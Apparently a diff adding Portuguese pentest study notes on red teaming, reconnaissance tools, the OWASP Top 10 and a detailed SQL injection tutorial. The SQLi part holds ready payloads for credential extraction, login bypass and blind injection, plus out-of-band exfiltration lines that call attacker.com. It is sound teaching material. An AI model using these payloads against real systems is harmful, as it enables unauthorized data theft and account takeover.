+A ideia de times "Azul" e "Vermelho" vem do léxico militar, nascida nos jogos de guerra dos anos 1960 (War Games) para avaliar prontidão defensiva, pensamento analítico e tomada de decisão.
+
+**Red Teaming** não é propriamente um time — é uma **forma de pensar**: uma abordagem cognitiva flexível adaptada a cada organização e situação.
+
+### Jogos finitos x infinitos
+Atacar e defender são atividades assimétricas:
+- **Atacar** é um jogo **finito**: delimitado no tempo, há um vencedor, jogadores conhecidos, regras fixas, objetivo pré-acordado.
+- **Defender** é um jogo **infinito**: sem delimitação temporal, sem vencedores, jogadores conhecidos e desconhecidos, regras não fixas, objetivo é continuar jogando.
+
+Consequências dessa assimetria:
+1. **Estratégias diferentes**: defensores precisam de esforço contínuo 24x7x365, atenção em superfície, tarefa prolongada → fadiga de alerta. Atacantes têm monopólio da iniciativa, fator surpresa, furtividade.
+2. **Desgaste no convívio**: equipe de defesa cansada e pressionada em falhas; equipe de ataque pressionada por não encontrar vulnerabilidades; ambas sujeitas ao viés de retrospectiva (hindsight bias) por gestores e pares.
+3. **Rivalidade**: atrito entre equipes prejudica comunicação, cria abismos profissionais, atrapalha o amadurecimento da segurança como um todo.
+
+A emulação de adversário (ferramentas como **VECTR**) e os exercícios de **Purple Team** buscam romper essa rivalidade, unindo ataque e defesa num ciclo colaborativo de melhoria contínua.
+
+## 2.7 Liderança Aplicada à Segurança Ofensiva
+
+O profissional sênior de Red Team acumula funções que vão além da técnica: lidera equipes, vende o valor do trabalho para a diretoria, negocia escopo com clientes, orienta juniores e sustenta a credibilidade do time perante o Blue Team. As competências abaixo emergem diretamente desses contextos.
+
+**Comunicar risco, não só vulnerabilidade:**
+> O C-level não toma decisão com base em CVSS 9.8 — toma com base em impacto de negócio. O profissional sênior traduz achados técnicos em linguagem executiva: "essa falha permite que um atacante externo acesse os dados de pagamento de todos os clientes em menos de 20 minutos, sem credenciais". Essa tradução é uma habilidade de liderança, não apenas técnica.
+
+**Construir confiança antes de ter autoridade:**
+> Red Team frequentemente opera sem autoridade formal sobre as equipes que testa. A credibilidade que permite que o Blue Team receba um achado crítico sem entrar em modo defensivo vem de relacionamento construído ao longo do tempo — não de cargo. Times que se respeitam mutuamente produzem Purple Team de qualidade; times com rivalidade produzem relatórios que ninguém lê.
+
+**Orientar sem criar dependência:**
+> Um analista júnior que só executa ferramentas é um risco operacional — se sair, o time perde capacidade. O sênior que ensina o raciocínio por trás da técnica (por que esse payload, por que esse vetor, por que essa sequência) multiplica a capacidade do time em vez de concentrá-la.
+
+**Priorizar impacto, não volume:**
+> Em um pentest com prazo limitado, encontrar 40 vulnerabilidades de baixa severidade tem menos valor do que encontrar 3 de alta e demonstrá-las com prova de conceito. Saber o que descartar é tão importante quanto saber o que explorar — e isso exige julgamento, não só técnica.
+
+**Sustentar ritmo sem queimar o time:**
+> Red Team work tem picos de intensidade (exercícios longos, deadlines de relatório, resposta a incidentes). Líderes que não gerenciam isso produzem rotatividade alta em funções onde o conhecimento acumulado é crítico. Construir cadência sustentável — incluindo revisão de lições aprendidas após cada exercício — é gestão, não fraqueza.
+
+**Aceitar que autoridade técnica tem limite:**
+> O profissional mais habilidoso tecnicamente nem sempre é o melhor para liderar o projeto. Reconhecer isso — e colocar a pessoa certa na função certa, mesmo que seja outra — é o que separa o especialista do líder.
+
+---
+
+## 2.8 Fundamentos de Liderança (referência de base)
+
+Resumo das "Leis de Liderança" (John Maxwell):
+- **Lei do Limite**: a capacidade de liderança determina o grau de eficácia da pessoa.
+- **Lei da Influência**: liderança é, acima de tudo, influência.
+- **Lei do Processo**: liderança se desenvolve diariamente, não da noite para o dia.
+- **Lei da Base Sólida**: confiança é o fundamento da liderança.
+- **Lei da Conexão**: líderes tocam o coração antes de pedir uma "mãozinha".
+- **Lei do Círculo Íntimo**: o potencial do líder é definido por quem está mais próximo dele.
+- **Lei do Fortalecimento**: só líderes seguros empoderam os outros.
+- **Lei da Vitória**: líderes encontram formas de o time vencer — celebrar junto.
+- **Lei das Prioridades**: movimento não é o mesmo que realização.
+- **Lei do Sacrifício**: liderar exige abrir mão, é via de mão dupla.
+
+**Líder** inspira, motiva junto, escuta, orienta e desenvolve pessoas. **Chefe** manda, cobra, impõe decisões de cima e controla pessoas. Qualidades centrais: caráter, experiência, relacionamento, empatia, resiliência, autoconhecimento, inteligência emocional.
+
+
+---
+
+# Reconhecimento e Enumeração
+
+*Nível: Intermediário. "É a fase mais importante do Pentest."*
+
+## 3.1 Information Gathering (OSINT)
+
+Information Gathering é a coleta de dados sobre pessoas e sistemas usando fontes abertas.
+
+### Google Hacking / Dorking
+Operadores avançados de busca:
+
+| Operador | Função |
+|---|---|
+| `site:` | restringe resultados a um domínio |
+| `inurl:` | busca termo na URL |
+| `filetype:` | busca por extensão de arquivo |
+| `intitle:` | busca termo no título da página |
+| `intext:` | busca termo no corpo do texto |
+| `cache:` | exibe versão em cache do Google |
+
+Exemplo de enumeração de subdomínios: `site:*.alvo.com -site:www.alvo.com`.
+
+### Outras fontes OSINT
+- **[Hunter.io](https://hunter.io)**: coleta e-mails corporativos associados a um domínio.
+- **[Have I Been Pwned](https://haveibeenpwned.com)** / **[leak-lookup.com](https://leak-lookup.com)**: verifica vazamentos de credenciais.
+- **[Pastebin](https://pastebin.com)**: busca de conteúdo publicado publicamente (muitas vezes credenciais vazadas).
+- **[TheHarvester](https://github.com/laramies/theHarvester)**: coleta e-mails, subdomínios, hosts, nomes de funcionários, portas abertas e banners de múltiplas fontes públicas (motores de busca, servidores PGP, Shodan).
+- **[Tor](https://www.torproject.org)**: navegação anônima para pesquisa sem expor origem.
+- **[Maltego](https://www.maltego.com)**: correlaciona dados de fontes abertas (pessoas, empresas, domínios, IPs, arquivos) de forma visual.
+- **[Recon-ng](https://github.com/lanmaster53/recon-ng)**: framework de reconhecimento web em Python, com funções de conveniência e banco de dados integrado.
+
+## 3.2 Advanced Information Gathering
+
+### Infraestrutura da Internet
+- **IANA** (Internet Assigned Numbers Authority): autoridade que gerencia alocação global de endereços IP.
+- **Root Servers**: servidores DNS raiz.
+- **RIR/NIR** (Regional/National Internet Registry): distribuem blocos de IP regionalmente.
+- **WHOIS**: consulta dados de registro de domínio (`whois dominio.com`).
+
+### Ferramentas de reconhecimento passivo/ativo
+- **[Shodan](https://www.shodan.io)**: motor de busca de dispositivos conectados à internet (servidores, câmeras, sistemas industriais).
+  - Filtros disponíveis: `country:`, `port:`, `org:`, `hostname:`
+  - Ex.: `apache 2.4.1` retorna servidores anunciando essa versão — útil combinado com CVEs conhecidas
+- **[Censys](https://censys.io)**: similar ao Shodan, indexação de hosts e certificados.
+- **[VirusTotal](https://www.virustotal.com)**: agrega +70 mecanismos antivírus para análise de arquivos/links suspeitos.
+- **robots.txt**: revela quais diretórios o site pede para não indexar (pode apontar áreas sensíveis).
+- **curl -v**: exibe cabeçalhos HTTP detalhados (servidor, linguagem/versão).
+- **WhatWeb**: identifica tecnologias, versões, e-mails, erros de SQL de um domínio.
+- **Wappalyzer**: extensão de navegador que identifica frameworks, CMS, processadores de pagamento e outras tecnologias usadas em um site.
+
+## 3.3 Enumeração de Subdomínios
+
+Três métodos principais: **Brute Force, OSINT e Host Virtual**.
+
+- **Certificate Transparency (CT)**: registros públicos de certificados SSL/TLS emitidos para um domínio, pesquisáveis em **[crt.sh](https://crt.sh)** — revela subdomínios historicamente registrados.
+- **DNS Brute Force**: testar milhares de subdomínios de uma wordlist.
+- **[Sublist3r](https://github.com/aboul3la/Sublist3r)**: ferramenta que acelera descoberta via OSINT.
+- **Hosts Virtuais**: subdomínios nem sempre estão em DNS público — podem estar em `/etc/hosts` do desenvolvedor. Servidores hospedam múltiplos sites por IP único, diferenciando pelo cabeçalho `Host`. Testado com `ffuf -H "Host: FUZZ.dominio.com"`.
+
+## 3.4 Descoberta de Conteúdo Web
+
+Conteúdo oculto: páginas de equipe, versões antigas, backups, arquivos de configuração, painéis admin.
+
+### Verificação manual
+- `/robots.txt`, `/sitemap.xml` — pistas sobre estrutura do site.
+- **Favicon**: pode identificar o framework usado (banco de ícones da OWASP).
+- Cabeçalhos HTTP (`Server`, `X-Powered-By`) revelam stack tecnológica.
+
+### OSINT
+- **[WayBack Machine](https://web.archive.org)**: histórico arquivado de páginas, pode revelar conteúdo antigo ainda acessível.
+- **GitHub**: busca por nome da empresa pode revelar repositórios com credenciais ou código vazado no histórico de commits.
+- **S3 Buckets**: `https://{nome}.s3.amazonaws.com` — padrões comuns: `{empresa}-assets`, `-backup`, `-www`, `-dev`. Má configuração de permissões expõe arquivos públicos.
+
+### Descoberta automatizada
+```
+ffuf -w wordlist -u http://IP/FUZZ
+dirb http://IP/ wordlist
+gobuster dir --url http://IP/ -w wordlist
+```
+
+## 3.5 Ferramentas de Varredura de Domínio/Diretório
+
+- **[WHATWEB](https://github.com/urbanadventurer/WhatWeb)**: coleta sistemas, versões, e-mails, erros SQL de um domínio.
+- **[DNSMAP](https://github.com/resurrecting-open-source-projects/dnsmap)**: verifica subdomínios comuns via wordlist.
+- **[DIRB](https://github.com/v0re/dirb)**: brute-force de pastas/arquivos, simples, sem threads.
+- **[DIRBUSTER](https://github.com/KajanM/DirBuster)**: brute-force com GUI (Java), suporta threads e recursividade.
+- **[GOBUSTER](https://github.com/OJ/gobuster)**: escrito em Go, popular, suporta threads mas sem recursividade nativa.
+- **[FEROXBUSTER](https://github.com/epi052/feroxbuster)**: feito em Rust, estável, focado em performance.
+- **[DIRSEARCH](https://github.com/maurosoria/dirsearch)**: permite pausar/retomar escaneamento, mas sequencial.
+
+### Gobuster — flags principais
+```
+gobuster dir -u URL -w wordlist -t 64       # modo diretório
+gobuster dns -d dominio.com -w wordlist     # enumera subdomínios
+gobuster vhost -u URL -w wordlist           # força bruta de hosts virtuais
+```
+Flags úteis: `-x` (extensões), `-c` (cookie), `-H` (header), `-s`/`-b` (filtrar status codes), `-r` (seguir redirecionamentos), `--delay` (evitar detecção).
+
+## 3.6 Scanning
+
+- **Scanner de Rede**: descobre estrutura, hosts ativos/inativos.
+- **Scanner de Porta**: identifica portas abertas/fechadas, serviços e versões.
+
+**Ping Sweep:**
+- Envio de pacotes ICMP Echo Request para um range de IPs;
+- Quem responde Echo Reply está ativo.
+
+> ⚠️ **Atenção:** ausência de resposta não confirma host offline (pode haver firewall ou host configurado para ignorar ICMP).
+
+Pacotes ICMP TTL: Linux = 64, Windows = 128.
+
+Handshake incompleto:
+- Porta **fechada** → retorna **RA (RST-ACK)**.
+- Porta **filtrada** por firewall → **sem retorno**.
+
+### NMAP
+Ferramenta de varredura de rede/auditoria de segurança, descoberta de hosts e serviços.
+```
+nmap -sS -sV -sC alvo       # SYN scan + versão + scripts padrão
+```
+NSE (Nmap Scripting Engine): scripts testam problemas comuns, força bruta, análise de protocolo e detecção básica de vulnerabilidades.
+
+## 3.7 Enumeração de Serviços
+
+**Objetivos:**
+- Identificar banner/versão do serviço;
+- Identificar tecnologias web empregadas, framework/CMS;
+- Analisar código-fonte em busca de leaks (usuários, senhas, comentários).
+
+| Serviço (porta) | Ferramentas |
+|---|---|
+| HTTP/HTTPS (80/443) | DIRB, DIRBUSTER, GOBUSTER, FEROXBUSTER, NIKTO, DIRSEARCH |
+| SMB/RPC (445/139) | SMBCLIENT, ENUM4LINUX, SMBMAP, CRACKMAPEXEC, RPCCLIENT |
+| FTP (21) | cliente FTP nativo |
+| SSH (22) | HYDRA (brute force) |
+| SMTP (25) | SMTP-USER-ENUM |
+| SNMP (161) | SNMP-CHECK, ONESIXTYONE |
+| NFS (111) | NFS-COMMON, SHOWMOUNT |
+
+- **[NIKTO](https://github.com/sullo/nikto):**
+  - Testa servidores web quanto a erros de configuração, arquivos padrão/inseguros, servidores desatualizados;
+  - Não é furtivo, prioriza minúcia.
+
+- **[SMBClient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) / [SMBMap](https://github.com/ShawnDEvans/smbmap):**
+  - Interagem com compartilhamentos SMB (download/upload, permissões);
+  - Login anônimo frequentemente revela leitura pública.
+
+- **[ENUM4LINUX](https://github.com/CiscoCXSecurity/enum4linux):**
+  - Automatiza enumeração de SMB/RPC (shares, usuários, grupos).
+
+- **[CRACKMAPEXEC](https://github.com/byt3bl33d3r/CrackMapExec):**
+  - Ferramenta de pós-exploração focada em ambientes Active Directory, suporta múltiplos protocolos (SMB, WinRM, MSSQL, LDAP, SSH);
+  - Enumeração: versão do SO, shares, usuários, grupos, políticas de senha, SMB signing;
+  - Autenticação: testa credenciais em múltiplos hosts simultaneamente (credential spraying), suporta Pass-the-Hash;
+  - Execução remota de código via WMI, schtasks, MMC ou PSExec;
+  - Dump de credenciais: SAM, LSA, NTDS.dit, LSASS (via módulos como Mimikatz);
+  - Integração com BloodHound para mapeamento de caminhos de ataque no AD.
+
+- **SNMP ([onesixtyone](https://github.com/trailofbits/onesixtyone) / [snmp-check](https://gitlab.com/kalilinux/packages/snmpcheck)):**
+  - Protocolo de gerenciamento de rede;
+  - Community strings padrão (`"public"`) frequentemente expõem informações de sistema.
+
+- **Enumeração MySQL ([scripts NSE](https://nmap.org/nsedoc/categories/discovery.html)):**
+  - Via scripts NSE (`--script nmap*`) revela acesso anônimo/root sem senha;
+  - Também possível via Metasploit.
+
+## 3.8 Captura de Tráfego
+
+- **[WIRESHARK](https://www.wireshark.org)**: GUI para detectar problemas de rede, anomalias de segurança (hosts invasores, portas anormais), inspecionar protocolos. Permite marcar/comentar pacotes, exportar, e usar "Follow TCP Stream".
+- **[TCPDUMP](https://www.tcpdump.org)**: linha de comando, captura e filtra pacotes.
+```
+tcpdump -i eth0 -w captura.pcap          # salva captura
+tcpdump -r captura.pcap                  # lê arquivo
+tcpdump host IP and port 80              # filtro combinado
+tcpdump -nn -v                           # sem resolução de nomes, verboso
+```
+**Operadores lógicos:** `and`, `or`, `not`
+
+**Filtros:**
+- `src/dst host` — filtra por IP de origem/destino
+- `src/dst port` — filtra por porta de origem/destino
+- Protocolo: `ip`, `tcp`, `udp`, `icmp`
+- `greater`/`less` — filtra por tamanho do pacote
+
+### Sniffing e MITM (ataques de rede)
+Sniffing captura tráfego não criptografado (credenciais, mensagens). Mais difícil hoje com TLS amplamente adotado, mas eficaz contra redes internas sem criptografia, sistemas legados, IoT.
+Ferramentas:
+- [TCPDUMP](https://www.tcpdump.org)
+- [WIRESHARK](https://www.wireshark.org)
+- [TSHARK](https://tshark.dev)
+- [TCPFLOW](https://github.com/simsong/tcpflow)
+- [NGREP](https://github.com/jpr5/ngrep)
+- [NETWORKMINER](https://www.netresec.com/?page=NetworkMiner)
+
+**Man-in-the-Middle:**
+
+Técnicas:
+- **ARP Spoofing**: associa o MAC do atacante ao IP do gateway
+- **DNS Spoofing**: respostas DNS falsas redirecionam o tráfego
+- **Rogue Access Points**: ponto de acesso Wi-Fi falso
+- **BGP Hijacking**: interceptação em nível de roteamento
+
+Mitigações: HSTS, Certificate Transparency, Certificate Pinning, DANE
+
+Ferramentas:
+- [Bettercap](https://www.bettercap.org)
+- [Ettercap](https://www.ettercap-project.org)
+- [mitmproxy](https://mitmproxy.org)
+- [Responder](https://github.com/lgandx/Responder)
+
+## 3.9 Banco de Dados de Vulnerabilidades
+
+- **[CVE](https://www.cve.org)** (Common Vulnerabilities and Exposures):
+  - Identificador único de uma vulnerabilidade conhecida (ex: `CVE-2024-21413`);
+  - Mantido por CNAs (organizações autorizadas a atribuir IDs).
+
+- **[CVSS](https://www.first.org/cvss)** (Common Vulnerability Scoring System):
+  - Pontuação 0–10 refletindo facilidade de exploração e impacto:
+    > Baixo: 0.0–3.9
+    >
+    > Médio: 4.0–6.9
+    >
+    > Alto: 7.0–8.9
+    >
+    > Crítico: 9.0–10.0
+
+- **[CPE](https://nvd.nist.gov/products/cpe)** (Common Platform Enumeration):
+  - Nomenclatura padronizada de fornecedor/produto/versão afetados.
+
+- **[CWE](https://cwe.mitre.org)** (Common Weakness Enumeration):
+  - Classifica a causa raiz da vulnerabilidade (ex: CWE-89 = SQL Injection).
+
+- **[NVD](https://nvd.nist.gov)** (National Vulnerability Database, mantido pelo NIST):
+  - Enriquece registros CVE com pontuação CVSS própria, mapeamento CPE e análise de impacto;
+  - Mais útil para priorização de risco que a CVE List isolada.
+
+- **[ExploitDB](https://www.exploit-db.com)**:
+  - Foco em provas de conceito (PoC) e técnicas reais de exploração;
+  - Inclui EDB-ID, metadados (autor, plataforma, data) e código de PoC.
+
+- Boletins de segurança de fornecedores e bases regionais/comunitárias complementam CVE/NVD.
+
+**Gravidade vs Risco:**
+- Gravidade é o impacto técnico;
+- Risco depende do contexto (exposição, uso, criticidade de negócio).
+
+> ⚠️ Uma vulnerabilidade de alta gravidade isolada tem risco menor que uma média exposta em produção.
+
+## 3.10 Ferramentas de Escaneamento de Vulnerabilidades
+
+Tipos de scanner:
+- **Scanner de Rede**: mapeia portas/serviços expostos.
+- **Scanner de Aplicação Web**: foca na camada HTTP/HTTPS (ex: formulários de login).
+- **Scanner Baseado em Host**: roda localmente, verifica patches ausentes e configuração interna.
+
+Ferramentas:
+- **[NMAP](https://nmap.org)**: NSE para avaliação ágil;
+- **[NIKTO](https://github.com/sullo/nikto)**: servidores web, não furtivo;
+- **[OpenVAS](https://www.openvas.org)**: varredura profunda autenticada/não-autenticada — instalável via Docker:
+  ```
+  docker run -d -p 443:443 --name openvas immauss/openvas
+  ```
+
+**Varreduras autenticadas vs não autenticadas:**
+- Autenticadas usam credenciais, identificam vulnerabilidades exploráveis por quem já tem acesso;
+- Não autenticadas simulam um atacante externo sem credenciais.
+
+**Varreduras internas vs externas:**
+- Internas simulam ataque já dentro da rede;
+- Externas simulam ataque de fora da rede local/corporativa.
+
+Scanners comerciais:
+- **[Nessus](https://www.tenable.com/products/nessus)**: scanner de vulnerabilidades amplamente adotado em ambientes corporativos;
+- **[Qualys](https://www.qualys.com)**: solução SaaS, varredura contínua sem necessidade de infraestrutura local;
+- **[Nexpose](https://www.rapid7.com/products/nexpose)**: pontuação de risco por ativo, integração com Metasploit.
+
+### Boas práticas de varredura
+- Começar leve (não intrusivo);
+- Usar a ferramenta certa para cada tarefa;
+- Revisar manualmente achados de alta gravidade (falsos positivos existem);
+- Manter ferramentas/feeds atualizados;
+- Preferir varreduras autenticadas quando permitido;
+- Comparar resultados ao longo do tempo;
+- Agendar para horários de baixo tráfego.
+
+
+---
+
+# Vulnerabilidades Web
+
+*Nível: Intermediário a Avançado. Organizado conforme o [OWASP Top 10 2021](https://owasp.org/www-project-top-ten).*
+
+## 4.1 Visão Geral — OWASP Top 10 (2021)
+
+| # | Categoria | Seção |
+|---|---|---|
+| A01 | Quebra de Controle de Acesso | 4.2 |
+| A02 | Falhas Criptográficas | 4.3 |
+| A03 | Injeção | 4.4 |
+| A04 | Design Inseguro | 4.5 |
+| A05 | Configuração Incorreta de Segurança | 4.6 |
+| A06 | Componentes Vulneráveis e Desatualizados | 4.7 |
+| A07 | Falhas de Identificação e Autenticação | 4.8 |
+| A08 | Falhas de Software e Integridade de Dados | 4.9 |
+| A09 | Falhas de Monitoramento e Registro | 4.10 |
+| A10 | SSRF (Server-Side Request Forgery) | 4.11 |
+
+Seções complementares: 4.12 OWASP API Security Top 10 · 4.13 Devtools — Aba Storage
+
+## 4.2 A01 — Quebra de Controle de Acesso (Broken Access Control)
+
+**Nº 1 do OWASP Top 10 2021** (subiu da 5ª posição em 2017). Não é uma vulnerabilidade isolada, mas uma categoria que engloba IDOR, CSRF, sequestro de sessão, escalação de privilégios, manipulação de JWT etc.
+
+Controle de acesso = **Autenticação** (verificar identidade) + **Autorização** (conceder permissões específicas).
+
+### Vulnerabilidades típicas
+- Ausência do princípio do privilégio mínimo ou negação por padrão.
+- Ignorar verificações ao modificar URL, parâmetros, estado interno, HTML ou requisições de API.
+- Visualizar/editar conta de outro usuário via divulgação de identificador.
+- Acesso irrestrito a operações POST/PUT/DELETE de API.
+- Manipulação de metadados: reproduzir/adulterar token (JWT, cookie, campo oculto) para elevar privilégio.
+- CORS mal configurado permitindo origens não confiáveis.
+- Navegação em páginas autenticadas/privilegiadas sem a devida verificação.
+
+### Ataques principais
+Força bruta, sequestro de sessão, Man-in-the-Middle, ataques de repetição, elevação de privilégios (horizontal — mesmo nível; vertical — nível superior).
+
+### Exploração prática — manipulação de parâmetro/cookie
+```
+http://online-service.com/profile?user_id=1000  →  ?user_id=1001
+```
+
+### Exploração prática — JWT
+Um JWT em Base64 pode ser decodificado, o campo `payload` (ex: ID do usuário) alterado, reencodado e reenviado — autenticando como outro usuário, inclusive admin.
+
+### Identificação (checklist de teste)
+- Autenticação com credenciais inválidas;
+- Acesso pós-logout sem invalidação de sessão;
+- Teste de permissões excedentes;
+- Repetição de requisições de outro usuário;
+- Força bruta;
+- Teste de redefinição de senha;
+- Teste de bloqueio de conta;
+- Captura de tráfego (Wireshark);
+- Revisão de código;
+- Teste de redirecionamento inseguro;
+- Análise de cookies (flags HttpOnly/Secure);
+- Ferramentas automatizadas (Burp Suite, OWASP ZAP).
+
+### 4.2.1 IDOR (Insecure Direct Object Reference)
+
+Ocorre quando o servidor recebe uma entrada do usuário para recuperar um objeto (arquivo, conta, dado) sem validar se o objeto pertence ao solicitante.
+
+Técnicas de descoberta:
+- **IDs codificados**: decodificar Base64, alterar, recodificar, reenviar.
+- **IDs com hash**: MD5 é comum; usar [CrackStation](https://crackstation.net).
+- **IDs imprevisíveis**: criar duas contas e trocar os IDs entre elas para testar vazamento.
+
+O endpoint vulnerável nem sempre está na URL — pode estar em requisição AJAX ou arquivo JavaScript.
+
+### 4.2.2 CSRF (Cross-Site Request Forgery)
+
+Engana o navegador da vítima, já autenticado, para enviar uma requisição a um site sem seu conhecimento. O navegador inclui cookies automaticamente, fazendo o servidor tratar a requisição como legítima.
+
+> ℹ️ O CSRF era categoria independente no OWASP 2017 (A08). No OWASP 2021 foi absorvido por A01, pois representa uma falha de verificação de origem — portanto de controle de acesso.
+
+**Três condições necessárias:**
+1. Vítima autenticada no aplicativo alvo.
+2. Aplicativo executa ação que altera estado (state-changing).
+3. Aplicativo não verifica a origem da requisição.
+
+> ⚠️ **Equívoco comum**: usar método POST não protege sozinho contra CSRF — tanto GET quanto POST são exploráveis se a origem não for validada.
+
+**Exemplo de ataque (conceitual):** um formulário oculto, auto-submetido via JavaScript, aponta para o endpoint vulnerável do alvo (ex: `update_email.php`), usando o cookie de sessão já presente no navegador da vítima.
+
+**Detecção em pentest:** priorizar endpoints que alteram estado; verificar presença/força do token CSRF; checar se GET é usado para ações sensíveis; testar requisição de origem externa; observar se autenticação depende só de cookie de sessão.
+
+**Defesa:** tokens CSRF únicos, imprevisíveis e validados pelo servidor; flag `SameSite` no cookie.
+
+---
+
+## 4.3 A02 — Falhas Criptográficas
+
+Categoria renomeada pela OWASP de "Exposição de Dados Sensíveis" (3º lugar em 2017) para **"Falhas Criptográficas"** (2º lugar em 2021) — na maioria das vezes, é a falta ou falha de criptografia que leva à exposição.
+
+### Causas comuns
+- Configuração inadequada (portas abertas, permissões excessivas);
+- Armazenamento impróprio (bancos mal configurados, repositórios públicos);
+- Exposição de APIs;
+- Vazamento por erro de programação;
+- Erro humano.
+
+### Checklist de mapeamento de risco
+- Transmissão insegura (HTTP/SMTP/FTP sem TLS, inclusive tráfego interno);
+- Algoritmos criptográficos obsoletos;
+- Gestão de chaves (reutilização, chaves em repositório);
+- Falta de criptografia onde necessário;
+- Validação de certificados (evitar MITM);
+- Proteção de vetores de inicialização (evitar modo ECB);
+- Nunca usar senha diretamente como chave;
+- Aleatoriedade adequada;
+- Evitar hash obsoleto (MD5/SHA1);
+- Métodos de preenchimento seguros (evitar PKCS#1 v1.5);
+- Evitar vazamento via mensagens de erro criptográficas (ataques de Oracle de preenchimento).
+
+### Técnicas de busca prática
+- Fuzzing de diretórios/arquivos (ex: FEROXBUSTER);
+- Code Review — comentários esquecidos, dados sensíveis no código-fonte;
+- Interceptação de requisições (Burp Suite) — observar dados expostos indevidamente (UID, tokens).
+
+---
+
+## 4.4 A03 — Injeção
+
+Ocorre quando dados não confiáveis são enviados a um interpretador (SQL, SO, LDAP, etc.) como parte de um comando ou consulta, permitindo execução de ações não autorizadas.
+
+### 4.4.1 SQL Injection (SQLi)
+Entrada do usuário concatenada diretamente em uma consulta SQL sem sanitização, manipulando a lógica da query. Uma das vulnerabilidades mais antigas e prejudiciais em aplicações web — permite roubar, alterar ou deletar dados e contornar autenticação.
+
+**Pontos de injeção a testar:** parâmetros de URL, campos de formulário (login, busca, comentários), cookies, cabeçalhos HTTP.
+
+#### Detecção
+Inserir caracteres de teste e observar a resposta:
+- `'` (aspa simples): erro de banco de dados → entrada sem sanitização
+- `"` (aspa dupla): consultas que usam aspas duplas
+- `;--`: comportamento diferente (sintaxe de comentário sendo processada)
+- `OR 1=1`: altera resultados → entrada afeta lógica da query
+
+#### Operadores SQL relevantes
+- **UNION**: combina resultados de duas ou mais instruções SELECT — ambas devem ter o mesmo número de colunas com tipos compatíveis.
+- **LIKE + curingas**: `%` (qualquer sequência), `_` (um caractere). Usado em Blind SQLi para enumerar dados caractere a caractere (`LIKE 'a%'`, `LIKE 'b%'`...).
+- **LIMIT offset, count**: controla qual linha é retornada; evita saída excessiva.
+- **group_concat()**: agrupa valores de múltiplas linhas em uma string separada por vírgulas.
+  ```sql
+  SELECT group_concat(username, ':', password SEPARATOR '<br>') FROM users;
+  -- Retorna: admin:pass123<br>martin:secret
+  ```
+- **CONCAT()**: une valores de uma linha: `CONCAT(username, ':', password)` → `admin:pass123`.
+
+#### information_schema
+Banco de dados interno do MySQL/MariaDB/PostgreSQL que mapeia toda a estrutura do servidor:
+- `information_schema.tables`: lista tabelas (`table_schema` = banco, `table_name` = tabela).
+- `information_schema.columns`: lista colunas (`table_name`, `column_name`).
+Ponto de partida obrigatório para escalar de "consigo injetar" para "conheço toda a estrutura do banco".
+
+---
+
+#### In-Band SQLi
+Mesmo canal para enviar o ataque e receber os resultados (navegador).
+
+**Error-Based**: explora mensagens de erro do banco para obter nomes de tabelas, colunas, tipo de SGBD e estrutura de consultas internas.
+
+**Union-Based** — fluxo completo em 6 passos:
+```sql
+-- Passo 1: determinar número de colunas (adicionar até sumir o erro)
+1 UNION SELECT 1          -- erro
+1 UNION SELECT 1,2        -- erro
+1 UNION SELECT 1,2,3      -- sucesso → 3 colunas
+
+-- Passo 2: identificar colunas visíveis na página (usar 0 para suprimir resultado original)
+0 UNION SELECT 1,2,3      -- números visíveis indicam colunas utilizáveis
+
+-- Passo 3: extrair nome do banco
+0 UNION SELECT 1,2,database()
+
+-- Passo 4: enumerar tabelas
+0 UNION SELECT 1,2,group_concat(table_name)
+FROM information_schema.tables WHERE table_schema = 'nome_banco'
+
+-- Passo 5: enumerar colunas da tabela alvo
+0 UNION SELECT 1,2,group_concat(column_name)
+FROM information_schema.columns WHERE table_name = 'tabela_alvo'
+
+-- Passo 6: extrair dados
+0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM tabela_alvo
+```
+> Usa-se `0` ou `-1` como ID para garantir que a consulta original retorne vazio, exibindo apenas os resultados injetados.
+
+---
+
+#### Blind SQLi — Authentication Bypass
+Contorna login sem extrair dados — basta que a query retorne verdadeiro:
+```sql
+-- Consulta original:
+SELECT * FROM users WHERE username='' AND password='';
+
+-- Payload injetado no campo username:
+' OR 1=1;--
+
+-- Query resultante (sempre verdadeira, ignora senha):
+SELECT * FROM users WHERE username='' OR 1=1;--
+```
+Variações: `' OR 1=1#` (MySQL), `" OR 1=1--` (aspas duplas). Testar nos dois campos (usuário e senha).
+
+---
+
+#### Blind SQLi — Boolean-Based
+A página não retorna dados, mas exibe respostas diferentes para verdadeiro/falso:
+```sql
+-- Confirmar injeção (deve retornar true):
+admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
+
+-- Descobrir nome do banco letra a letra:
+admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--  -- falso?
+admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'b%';--  -- falso?
+-- Quando retornar true → encontrou a 1ª letra. Continuar: 'sa%', 'sb%'...
+
+-- Enumerar tabelas:
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables
+WHERE table_schema = 'nome_banco' AND table_name LIKE 'a%';--
+```
+Processo lento (múltiplas requisições por caractere), mas funciona quando todos os outros canais estão bloqueados.
+
+---
+
+#### Blind SQLi — Time-Based
+Quando a resposta é idêntica independente do payload — o indicador é o **tempo de resposta**:
+```sql
+-- Determinar número de colunas (adicionar até haver atraso de 5s):
+admin123' UNION SELECT SLEEP(5);--        -- sem atraso → coluna incorreta
+admin123' UNION SELECT SLEEP(5),2;--      -- atraso → 2 colunas confirmadas
+
+-- Enumerar banco letra a letra por tempo:
+admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
+-- Atraso de 5s → banco começa com 's'. Sem atraso → não começa com 's'.
+```
+> Usar valores de `SLEEP` entre 5–10s e repetir cada teste para eliminar ruído de rede.
+
+**Quando usar cada tipo:**
+- Conteúdo diferente para true/false → Boolean-Based
+- Resposta sempre idêntica → Time-Based
+
+---
+
+#### Out-of-Band (OOB) SQLi
+Usado quando In-Band e Blind falham. Requer que o servidor de banco de dados consiga fazer conexões de saída (DNS/HTTP). Dois canais: ataque (requisição web normal) e exfiltração (requisição de saída do banco).
+
+```sql
+-- MySQL — exfiltração via DNS (Windows, UNC path):
+SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
+-- O nome do banco vira subdomínio na consulta DNS capturada pelo servidor do atacante.
+
+-- MSSQL — xp_dirtree (mais comum, habilitado por padrão):
+EXEC master..xp_dirtree '\\attacker.com\share';
+
